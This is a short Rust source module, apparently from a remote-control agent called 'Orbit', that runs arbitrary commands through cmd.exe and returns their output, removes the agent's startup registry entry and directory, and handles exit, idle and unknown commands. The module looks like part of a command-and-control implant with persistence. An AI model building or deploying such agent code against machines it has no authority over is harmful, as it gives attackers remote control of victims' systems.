use crate::utils;

use std::io;
use std::process;
use std::thread;
use std::time;

// execute a cmd command
pub fn cmd_exec(cmd: &String) -> Result<String, io::Error> {
    // run cmd command
    let command = process::Command::new("cmd.exe")
        .args(["/C", cmd])
        .output()?;

    // get command's output as a String
    let output = if command.stdout.len() > 0 {
        command.stdout
    } else {
        command.stderr
    };

    // convert output to a string
    let output = String::from_utf8(output).unwrap_or(String::from("Cannot Read Command's Output"));
    Ok(output)
}

// delete agent
pub fn delete_agent() -> ! {
    // delete agent from sturtup registry
    utils::registry::rm_from_startup();
    // remove new agent dir
    utils::filesystem::rm_desired_dir();
    // exit
    exit();
}

// close agent
pub fn exit() -> ! {
    // exit with 0x0100 (256) exit code
    process::exit(0x0100);
}

// that function does nothing
pub fn nothing() -> Result<String, io::Error> {
    thread::sleep(time::Duration::from_secs(1));

    Ok(String::new())
}

pub fn unknown_command() -> Result<String, io::Error> {
    Ok(String::from("Orbit Error: Unknown Command"))
}
